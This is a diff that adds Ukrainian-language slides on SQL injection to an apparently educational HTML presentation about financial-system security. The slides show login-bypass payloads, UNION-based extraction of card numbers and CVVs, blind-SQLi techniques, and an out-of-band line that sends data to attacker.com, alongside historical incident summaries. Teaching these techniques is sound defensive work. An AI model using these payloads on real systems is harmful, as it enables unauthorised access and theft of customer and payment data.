@@ -198,7 +198,122 @@
       </div>
     </section>
 
-    <!-- 8. Підсумок -->
+    <!-- 8. SQLi Login Bypass -->
+    <section class="slide">
+      <h1>SQLi: обхід автентифікації</h1>
+      <h2>Класичний приклад bypass логіну</h2>
+      <div class="steps">
+        <div class="step">
+          <div class="step-num">1</div>
+          <div class="step-title">Форма логіну</div>
+          <div class="step-desc">Поля: username та password</div>
+        </div>
+        <div class="step">
+          <div class="step-num">2</div>
+          <div class="step-title">SQL-запит</div>
+          <div class="step-desc">SELECT * FROM users WHERE user='...' AND pass='...'</div>
+        </div>
+        <div class="step">
+          <div class="step-num">3</div>
+          <div class="step-title">Payload</div>
+          <div class="step-desc">Username: admin' -- &nbsp; Password: будь-що</div>
+        </div>
+        <div class="step">
+          <div class="step-num">4</div>
+          <div class="step-title">Результат</div>
+          <div class="step-desc">WHERE user='admin' --' AND pass='...' → вхід як admin</div>
+        </div>
+      </div>
+      <div class="highlight-box danger" style="margin-top: 1.2rem;">
+        <p>Варіації: ' OR '1'='1, ' OR 1=1 --, admin'/* — десятки способів обійти логін без параметризації.</p>
+      </div>
+    </section>
+
+    <!-- 9. UNION-based Extraction -->
+    <section class="slide">
+      <h1>UNION-based витягування даних</h1>
+      <h2>Техніка читання довільних таблиць</h2>
+      <div class="icon-list">
+        <div class="icon-list-item">
+          <span class="il-icon">1️⃣</span>
+          <span class="il-text"><strong>Визначення стовпців:</strong> ORDER BY 1, 2, 3... поки не буде помилка → кількість стовпців</span>
+        </div>
+        <div class="icon-list-item">
+          <span class="il-icon">2️⃣</span>
+          <span class="il-text"><strong>Визначення типів:</strong> UNION SELECT NULL, 'a', NULL... → знаходимо текстові стовпці</span>
+        </div>
+        <div class="icon-list-item">
+          <span class="il-icon">3️⃣</span>
+          <span class="il-text"><strong>Схема БД:</strong> UNION SELECT table_name, column_name FROM information_schema.columns</span>
+        </div>
+        <div class="icon-list-item">
+          <span class="il-icon">4️⃣</span>
+          <span class="il-text"><strong>Витягування:</strong> UNION SELECT card_number, cvv, expiry FROM payment_cards --</span>
+        </div>
+      </div>
+      <div class="highlight-box danger" style="margin-top: 1.2rem;">
+        <p>Один UNION SELECT = доступ до ВСІХ таблиць БД: users, transactions, cards, audit_logs.</p>
+      </div>
+    </section>
+
+    <!-- 10. Blind SQLi порівняння -->
+    <section class="slide">
+      <h1>Blind SQLi: порівняння технік</h1>
+      <h2>Коли відповідь сервера не містить даних напряму</h2>
+      <div class="card-grid">
+        <div class="card accent-orange">
+          <span class="card-icon">✅</span>
+          <div class="card-title">Boolean-based</div>
+          <div class="card-text">AND 1=1 → нормальна сторінка<br>AND 1=2 → інша відповідь<br>Побітове витягування даних<br>Швидкість: ~1 символ/запит</div>
+        </div>
+        <div class="card accent-purple">
+          <span class="card-icon">⏱️</span>
+          <div class="card-title">Time-based</div>
+          <div class="card-text">AND IF(1=1, SLEEP(5), 0)<br>Затримка = true, без затримки = false<br>Найповільніший метод<br>Швидкість: ~1 символ/5 сек</div>
+        </div>
+        <div class="card accent-blue">
+          <span class="card-icon">📡</span>
+          <div class="card-title">Out-of-band</div>
+          <div class="card-text">LOAD_FILE('\\\\attacker.com\\' + data)<br>Дані надсилаються через DNS/HTTP<br>Обходить фільтри відповідей<br>Швидкість: висока</div>
+        </div>
+      </div>
+      <div class="highlight-box warning" style="margin-top: 1.2rem;">
+        <p>Blind SQLi повільніший, але не менш небезпечний. Інструменти як sqlmap автоматизують процес за хвилини.</p>
+      </div>
+    </section>
+
+    <!-- 11. SQLi у фінансових системах -->
+    <section class="slide">
+      <h1>SQLi у фінансових системах</h1>
+      <h2>Реальні інциденти та наслідки</h2>
+      <div class="card-grid">
+        <div class="card accent-red">
+          <span class="card-icon">💳</span>
+          <div class="card-title">Heartland (2008)</div>
+          <div class="card-text">SQLi → 130 млн карток. Найбільший витік карткових даних в історії. Збитки $200M+</div>
+        </div>
+        <div class="card accent-orange">
+          <span class="card-icon">🏪</span>
+          <div class="card-title">7-Eleven (2007)</div>
+          <div class="card-text">SQLi у платіжній системі → крадіжка $2M через клоновані картки з викрадених даних</div>
+        </div>
+        <div class="card accent-purple">
+          <span class="card-icon">🏦</span>
+          <div class="card-title">Банки СНД (2015-2020)</div>
+          <div class="card-text">SQLi в онлайн-банкінгу → витік персональних даних, зміна балансів рахунків</div>
+        </div>
+        <div class="card accent-blue">
+          <span class="card-icon">📱</span>
+          <div class="card-title">FinTech стартапи</div>
+          <div class="card-text">Legacy-код, швидкий MVP без безпеки → SQLi у API платежів та переказів</div>
+        </div>
+      </div>
+      <div class="highlight-box danger" style="margin-top: 1.2rem;">
+        <p>Фінансові системи — ціль #1 для SQLi. Кожен запит до БД з даними клієнта = потенційний вектор атаки.</p>
+      </div>
+    </section>
+
+    <!-- 12. Підсумок -->
     <section class="slide">
       <span class="slide-icon">🛡️</span>
       <h1>Ключові висновки</h1>
